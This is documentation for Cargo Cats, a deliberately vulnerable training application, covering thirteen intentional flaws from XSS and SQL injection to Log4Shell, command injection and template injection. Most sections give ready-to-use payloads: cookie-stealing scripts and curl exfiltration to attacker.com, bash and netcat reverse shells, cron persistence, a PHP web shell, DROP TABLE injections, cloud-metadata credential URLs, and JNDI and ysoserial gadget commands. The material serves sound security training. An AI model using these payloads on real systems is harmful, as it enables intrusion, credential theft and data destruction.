# Cargo Cats Security Vulnerabilities Documentation

This document details the intentional security vulnerabilities present in the Cargo Cats application. **This application is designed for educational and testing purposes only and should NEVER be deployed in a production environment.**

## Vulnerability Index

1. [Cross-Site Scripting (XSS) - Tracking Functionality](#1-cross-site-scripting-xss---tracking-functionality-on-index-page)
2. [SQL Injection - Payment Feature](#2-sql-injection---payment-feature-of-shipments)
3. [Log4Shell (CVE-2021-44228) - Login Page](#3-log4shell-cve-2021-44228---login-page-username-field)
4. [Server-Side Request Forgery (SSRF) - Webhook Service](#4-server-side-request-forgery-ssrf---webhook-service)
5. [Command Injection - Webhook Service](#5-command-injection---webhook-service)
6. [Path Traversal - Image Service](#6-path-traversal---image-service-file-operations)
7. [Server-Side JavaScript Injection (SSJS) - Label Generation](#7-server-side-javascript-injection-ssjs---label-generation-service)
8. [Weak Password Storage - MD5 Hashing](#8-weak-password-storage---md5-hashing)
9. [Missing Authentication - Missing Access Controls](#9-missing-authentication---missing-access-controls)
10. [Insecure Session Management - Missing HTTPOnly Flag](#10-insecure-session-management---missing-httponly-flag)
11. [XML External Entity (XXE) - Document Processing Service](#11-xml-external-entity-xxe---document-processing-service)
12. [Untrusted Deserialization - Address Import Feature](#12-untrusted-deserialization---address-import-feature)
13. [Server-Side Template Injection / RCE (CVE-2025-66474) - Report Service](#13-server-side-template-injection--rce-cve-2025-66474---report-service)

---

### 1. Cross-Site Scripting (XSS) - Tracking Functionality on Index Page

**Vulnerability Details:**
The shipment tracking feature on both the main index page and dashboard accepts user input and reflects it directly into HTML responses without sanitization.

**Exploitation via Frontgate Interface:**
   - Make a GET request to: `/api/shipments/track?trackingId=<script>alert('XSS')</script>`
   - The malicious script is embedded in the HTML response

**Attack Scenarios:**
- **Session Hijacking:** `<script>fetch('//attacker.com/steal?cookie='+document.cookie)</script>` (possible due to missing HTTPOnly flag - see vulnerability #10)
- **Credential Harvesting:** Inject fake login forms to capture credentials
- **Admin Impersonation:** Execute actions on behalf of logged-in administrators

**Impact:** http://dataservice:8080/user
- Account takeover through session hijacking
- Credential theft and phishing attacks
- Malicious actions performed on behalf of authenticated users

---

### 2. SQL Injection - Payment Feature of Shipments

**Vulnerability Details:**
The payment processing functionality in the shipments section allows SQL injection through credit card and shipment ID parameters that are passed to the backend dataservice.

**Exploitation via Frontgate Interface:**

**Important Note:** This vulnerability cannot be exploited directly through the UI forms. The frontend validates input, so exploitation requires intercepting and modifying the API request.

1. **Through Shipment Payment Flow:**
   - Login and navigate to the Shipments page (`/shipments`)
   - Create a shipment or find an existing unpaid shipment
   - Click "Pay Now" button to open the payment modal
   - Use a web proxy tool (like Burp Suite or OWASP ZAP) to intercept the payment request
   - Modify either the `creditCardNumber` or `shipmentId` parameter in the API request to include SQL injection payload

2. **Malicious Payloads:**
   - **Data Extraction:** `'; SELECT username, password FROM user; --`
   - **Table Destruction:** `'; DROP TABLE shipment; --`
   - **Privilege Escalation:** `'; UPDATE user SET password='hacked' WHERE username='admin'; --`
   - **Data Modification:** `'; UPDATE shipment SET status='delivered' WHERE id=1; --`

**Impact:**
- Complete database compromise and data theft
- Administrative account takeover
- Data manipulation and destruction
- Access to sensitive customer information including passwords

---

### 3. Log4Shell (CVE-2021-44228) - Login Page Username Field

**Vulnerability Details:**
The application logs user-controlled input using a vulnerable version of Log4j, allowing remote code execution through JNDI lookups when usernames are logged during failed login attempts.

**Exploitation via Frontgate Interface:**

**Required Setup - JNDI-Exploit-Kit:**
Before exploitation, you must set up the JNDI-Exploit-Kit from https://github.com/pimps/JNDI-Exploit-Kit

1. **Install JNDI-Exploit-Kit:**
   ```bash
   git clone https://github.com/pimps/JNDI-Exploit-Kit.git
   cd JNDI-Exploit-Kit
   java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar
   ```

2. **Exploitation Process:**
   - Navigate to the login page (`/login`)
   - In the username field, enter one of the JNDI-Exploit-Kit payloads
   - Enter any password (will fail authentication and trigger logging)
   - Submit the login form
   - The JNDI lookup executes when the failed login is logged

3. **JNDI-Exploit-Kit Payloads:**

   **Reverse Shell (Replace with your IP and port):**
   ```
   ${jndi:ldap://192.168.64.1:1389/serial/CommonsCollections2/java_reverse_shell/192.168.64.1:2020}
   ```

   **Sleep Test (5 second delay to confirm vulnerability):**
   ```
   ${jndi:ldap://192.168.64.1:1389/serial/CommonsCollections2/sleep/5000}
   ```

   **Additional Payload Options:**
   - **DNS Exfiltration:** `${jndi:ldap://192.168.64.1:1389/serial/CommonsCollections2/dns_query/test.attacker.com}`
   - **Command Execution:** `${jndi:ldap://192.168.64.1:1389/serial/CommonsCollections2/command/whoami}`

4. **Complete Attack Flow:**
   - Start JNDI-Exploit-Kit server on attacker machine
   - Set up netcat listener for reverse shell: `nc -lvp 2020`
   - Navigate to Cargo Cats login page
   - Enter reverse shell payload as username
   - Submit login form with any password
   - Receive reverse shell connection from compromised server

**Impact:**
- Complete server compromise with remote code execution
- Access to internal network and services
- Data exfiltration and system manipulation
- Potential lateral movement within infrastructure

---

### 4. Server-Side Request Forgery (SSRF) - Webhook Service

**Vulnerability Details:**
The webhook functionality allows authenticated users to make the server send HTTP requests to arbitrary URLs, enabling attacks against internal services and infrastructure.

**Exploitation via Frontgate Interface:**

1. **Access Webhook Interface:**
   - Login to the application
   - Navigate to the Webhooks page (`/webhooks`)
   - Use the webhook notification testing features

2. **Internal Service Discovery:**
   - **Target Internal APIs:** `http://localhost:8080/actuator/health`
   - **Database Access:** `http://localhost:3306` (check for MySQL admin interfaces)
   - **Admin Panels:** `http://192.168.1.100/admin`
   - **Docker APIs:** `http://unix:/var/run/docker.sock/containers/json`

3. **Cloud Metadata Exploitation:**
   - **AWS:** `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
   - **Google Cloud:** `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`
   - **Azure:** `http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01`

4. **Attack Vectors:**

   **Through Webhook Notification Form:**
   - Use "Send Webhook Notification" feature
   - Enter internal URL in the webhook URL field
   - Select GET or POST method
   - Submit to probe internal services

**Attack Scenarios:**
- **Internal API Access:** Read sensitive data from internal microservices
- **Cloud Credential Theft:** Extract AWS/GCP/Azure credentials from metadata services
- **Internal Network Mapping:** Discover internal services and infrastructure
- **Bypass Security Controls:** Access services protected by firewalls

**Impact:**
- Access to internal services and sensitive APIs
- Cloud infrastructure compromise through metadata access
- Internal network reconnaissance and mapping
- Bypass of network security controls and firewalls

---

### 5. Command Injection - Webhook Service

**Vulnerability Details:**
The webhook connection testing feature executes shell commands with user-supplied input, allowing attackers to execute arbitrary system commands on the server.

**Exploitation via Frontgate Interface:**

1. **Access Command Injection Point:**
   - Login to the application
   - Navigate to Webhooks page (`/webhooks`)
   - Use the "Test Connection" feature

2. **Basic Command Injection:**
   - **Command Chaining:** `google.com; whoami`
   - **Command Substitution:** `google.com $(cat /etc/passwd)`
   - **Multiple Commands:** `google.com && ls -la /`
   - **Background Execution:** `google.com & nc -e /bin/bash attacker.com 4444`

3. **Advanced Exploitation Techniques:**

   **Reverse Shell Establishment:**
   ```
   google.com; bash -i >& /dev/tcp/attacker.com/4444 0>&1
   ```

   **File System Exploration:**
   ```
   google.com; find / -name "*.conf" -type f 2>/dev/null
   ```

   **Data Exfiltration:**
   ```
   google.com; cat /etc/passwd | curl -X POST -d @- http://attacker.com/data
   ```

   **System Information Gathering:**
   ```
   google.com; uname -a; id; ps aux; netstat -tulpn
   ```

4. **Attack Process:**
   - Enter malicious payload in the connection test URL field
   - Example: `8.8.8.8; cat /etc/passwd > /tmp/pwned.txt`
   - Submit the form through the webhook interface
   - The command executes on the server with application privileges

5. **Persistence and Escalation:**
   - **Cron Job Installation:** `google.com; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'" | crontab -`
   - **SSH Key Installation:** `google.com; mkdir -p ~/.ssh; echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys`
   - **Backdoor Creation:** `google.com; echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php`

**Attack Scenarios:**
- **Remote Shell Access:** Establish persistent shell access to the server
- **Data Theft:** Extract sensitive files and database contents
- **Lateral Movement:** Use compromised server to attack internal network
- **Service Disruption:** Modify or delete critical system files

**Impact:**
- Complete server compromise with arbitrary command execution
- Access to all application data and system files
- Potential privilege escalation to root access
- Use of server as pivot point for further network attacks

---

### 6. Path Traversal - Image Service File Operations

**Vulnerability Details:**
The image service allows path traversal attacks through both file viewing and file upload functionality, enabling attackers to read and write arbitrary files on the server.

**Exploitation via Frontgate Interface:**

1. **Read Sensitive Files:**
   ```
   GET /api/photos/view?path=../appsettings.json
   GET /api/photos/view?path=../../root/.bashrc
   GET /api/photos/view?path=../../../etc/passwd
   ```

2. **Write Malicious Files (via upload with traversal filename):**
   ```
   POST /api/photos/upload
   Content-Type: multipart/form-data
   
   file: (filename: "../../root/.bashrc", content: modified_bashrc_with_backdoor)
   ```

3. **Command Exfiltration Attack:**
   - Read existing bashrc file using path traversal
   - Modify content to include command monitoring hooks
   - Upload modified bashrc back to overwrite original
   - All root commands will be sent to attacker server

**Impact:**
- Access to sensitive configuration files and credentials
- Remote code execution through file modification
- Persistent backdoor installation

---

### 7. Server-Side JavaScript Injection (SSJS) - Label Generation Service

**Vulnerability Details:**
The shipping label generation service uses dangerous `eval()` statements to process user-supplied first and last names for "capitalization," creating a critical server-side JavaScript injection vulnerability that allows arbitrary code execution.

**Exploitation via Frontgate Interface:**

**Target Endpoint:** `POST /api/labels/generate`

1. **Access Label Generation:**
   - Navigate to the shipping/labels section of the application
   - Use the label generation form to create shipping labels
   - The vulnerability exists in the firstName and lastName input fields

2. **Basic SSJS Injection Payloads:**
   
   **Simple Code Execution Test:**
   ```json
   {
     "firstName": "\"; console.log('SSJS Injection executed!'); \"",
     "lastName": "Doe",
     "address": "123 Main Street, City, State 12345",
     "trackingId": "TRACK-12345678"
   }
   ```

   **Reverse Shell Establishment:**
   ```json
   {
     "firstName": "\"; require('child_process').exec('bash -i >& /dev/tcp/attacker.com/4444 0>&1'); \"",
     "lastName": "Doe",
     "address": "123 Main Street",
     "trackingId": "TRACK-12345678"
   }
   ```

   **System Command Execution (whoami):**
   ```json
   {
     "firstName": "\"; require('child_process').exec('whoami', (error, stdout, stderr) => { console.log('User:', stdout); }); \"",
     "lastName": "Doe",
     "address": "123 Main Street",
     "trackingId": "TRACK-12345678"
   }
   ```

3. **Attack Process:**
   - Send POST request to `/api/labels/generate` with malicious payload
   - The vulnerable eval() code processes: `eval('"${firstName}".charAt(0).toUpperCase() + "${firstName}".slice(1).toLowerCase()')`
   - Injected code executes with full Node.js application privileges
   - Attacker gains server-side code execution capabilities

**Attack Scenarios:**
- **Remote Code Execution:** Execute arbitrary system commands through Node.js child_process
- **Internal Network Access:** Use compromised service to pivot and attack internal systems
- **Data Theft:** Access application files, environment variables, and connected databases
- **Service Disruption:** Crash the service or modify critical application logic
- **Backdoor Installation:** Create persistent access mechanisms

**Impact:**
- Complete server compromise with full Node.js runtime access
- Access to all application data and system resources
- Potential lateral movement within containerized environments
- Ability to modify application behavior and steal sensitive data
- Server can be used as a pivot point for attacking internal network infrastructure

---

### 8. Weak Password Storage - MD5 Hashing

**Vulnerability Details:**
The application uses MD5 hashing for password storage, which is cryptographically broken and easily reversible using modern attack techniques.

**Exploitation via Frontgate Interface:**

1. **Password Hash Extraction:**
   - Use SQL injection vulnerability to extract password hashes
   - Through shipment payment: `'; SELECT username, password FROM user; --`
   - Retrieve MD5 hashes from the database

2. **Hash Cracking Methods:**
   - **Rainbow Tables:** Use precomputed MD5 rainbow tables for instant cracking
   - **Online MD5 Crackers:** Submit hashes to online cracking services
   - **Brute Force:** Use tools like hashcat or john for dictionary/brute force attacks
   - **Google Dorking:** Search for MD5 hash in search engines (often already cracked)

3. **Attack Process:**
   - Extract hash: `5d41402abc4b2a76b9719d911017c592` (MD5 of "hello")
   - Use rainbow table or online cracker to reveal: "hello"
   - Login with cracked credentials through `/login`

4. **Common Weak Passwords:**
   - Default admin credentials: `admin:password123` (if still using defaults)
   - Common patterns easily cracked from MD5 hashes
   - Dictionary words and simple variations

**Credential Reuse Attacks:**
- Test cracked passwords on other systems/services
- Use in social engineering attacks
- Access external accounts if users reuse passwords

**Impact:**
- Mass account compromise through hash cracking
- Administrative account takeover
- Unauthorized access to user shipments and personal data
- Potential for credential stuffing attacks on other services

---

### 9. Missing Authentication - Missing Access Controls

**Vulnerability Details:**
The application's security configuration incorrectly allows any authenticated user to delete cat records belonging to other users due to misconfigured Spring Security rules.

**Exploitation via Frontgate Interface:**

1. **Access the Vulnerability:**
   - Login to the application with any valid account
   - Navigate to the Cats section (`/cats`)
   - Note the cat IDs from the API response

2. **Exploit the Missing Authentication:**
   ```
   DELETE /api/cats/{any_cat_id}
   Authorization: Bearer {any_valid_token}
   ```

3. **Attack Process:**
   - Login as any user
   - Get list of cats: `GET /api/cats`
   - Delete any cat record: `DELETE /api/cats/1` (works regardless of ownership)
   - Verify deletion by checking the cats list again

**Impact:**
- Unauthorized data deletion by any authenticated user
- Data integrity compromise
- Potential denial of service through mass deletion

---

### 10. Insecure Session Management - Missing HTTPOnly Flag

**Vulnerability Details:**
The application's session cookies are not configured with the HTTPOnly flag, making them accessible to JavaScript code and enabling session token theft through XSS attacks.

**Exploitation via Frontgate Interface:**

1. **Identify Session Cookies:**
   - Login to the application
   - Check browser developer tools → Application → Cookies
   - Observe that session cookies (like JSESSIONID) lack the HTTPOnly flag

2. **Exploit via XSS (combined with vulnerability #1):**
   ```javascript
   // Steal session cookies via XSS
   <script>
   fetch('//attacker.com/steal', {
     method: 'POST', 
     body: 'cookies=' + document.cookie
   });
   </script>
   ```

3. **Session Hijacking Process:**
   - Use XSS vulnerability to inject cookie-stealing script
   - Extract session token from victim's browser
   - Use stolen session token to impersonate the victim
   - Access victim's account without knowing their password

**Impact:**
- Session hijacking and account takeover
- Bypasses authentication mechanisms
- Enables impersonation of legitimate users
- Amplifies the impact of XSS vulnerabilities

---

### 11. XML External Entity (XXE) - Document Processing Service

**Vulnerability Details:**
The DOCX document processing service uses lxml parser with insecure configuration that allows XML External Entity (XXE) processing.

**Exploitation:**
1. Create a malicious DOCX file containing XXE payload in XML components
2. Upload the file through the document processor interface at `/docservice`
3. The service processes internal XML files with external entity resolution enabled

**Example XXE Payload (in document.xml within DOCX):**
```xml
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<document>&xxe;</document>
```

**Attack Scenarios:**
- **File Disclosure:** Read sensitive files from the server filesystem
- **Internal Network Scanning:** Probe internal services and ports
- **Denial of Service:** Cause resource exhaustion through entity expansion

**Impact:**
- Information disclosure of server files and configuration
- Internal network reconnaissance
- Potential for further exploitation of internal services

---

### 12. Untrusted Deserialization - Address Import Feature

**Vulnerability Details:**
The address import functionality in the frontgateservice accepts serialized Java objects from users and deserializes them without proper validation, allowing attackers to execute arbitrary code via crafted serialized objects.

**Exploitation via Frontgate Interface:**

1. **Access the Vulnerability:**
   - Login to the application with any valid account
   - Navigate to the Addresses section (`/addresses`)
   - Use the Import feature accessible through the import button

2. **Malicious Payload Preparation:**
   - Create a malicious Java serialized object using tools like [ysoserial](https://github.com/frohoff/ysoserial)
   - The payload leverages gadget chains available in the application's classpath (Commons Collections, etc.)
   - Example command: `java -jar ysoserial.jar CommonsCollections2 "touch /tmp/pwned" > payload.ser`

3. **Attack Process:**
   - Upload the malicious serialized payload through the address import interface
   - Upon deserialization, the application executes the embedded command
   - The code executes with the privileges of the application server

4. **Example Payload Generation:**
   ```bash
   # Generate payload that executes 'touch /tmp/pwned' when deserialized
   java -jar ysoserial.jar CommonsCollections2 "touch /tmp/pwned" > payload.ser
   
   # Generate reverse shell payload
   java -jar ysoserial.jar CommonsCollections2 "bash -i >& /dev/tcp/attacker.com/4444 0>&1" > payload.ser
   ```

**Attack Scenarios:**
- **Remote Code Execution:** Execute arbitrary commands on the application server
- **Data Theft:** Access sensitive application data, configuration files, and credentials
- **Persistence:** Install backdoors or create privileged accounts
- **Lateral Movement:** Use compromised server as pivot point for further attacks

**Impact:**
- Complete server compromise with arbitrary command execution
- Access to all application data and internal resources
- Potential privilege escalation depending on application permissions
- Persistence via backdoors or added user accounts

---

## 🛡️ Additional Security Issues

### Cross-Site Request Forgery (CSRF)
- **Location:** API endpoints
- **Issue:** CSRF protection disabled for API endpoints
- **Impact:** Unauthorized actions can be performed on behalf of authenticated users

### Information Disclosure
- **Location:** Error messages and debug output
- **Issue:** Detailed error messages reveal system internals and file paths
- **Impact:** Assists attackers in reconnaissance and exploitation

---

### 13. Server-Side Template Injection / RCE (CVE-2025-66474) - Report Service

**Vulnerability Details:**
The report service uses XDocReport FreeMarker template engine v2.1.0, which allows Server-Side Template Injection (SSTI) via the unrestricted `?new` operator, enabling instantiation of `freemarker.template.utility.Execute` for Remote Code Execution.

**Exploitation via Frontgate Interface:**

1. Login and navigate to the Reports page (`/reports`)
2. In the template editor, enter:
   ```
   ${"freemarker.template.utility.Execute"?new()("whoami")}
   ```
3. Click "Generate Report" — the command output appears in the report

**Malicious Payloads:**
- **System Info:** `${"freemarker.template.utility.Execute"?new()("uname -a")}`
- **File Listing:** `${"freemarker.template.utility.Execute"?new()("ls -la /")}`
- **Environment Variables:** `${"freemarker.template.utility.Execute"?new()("env")}`

**Impact:**
- Remote code execution on the application server
- Data exfiltration (files, secrets, environment variables)
- Lateral movement to other services in the cluster

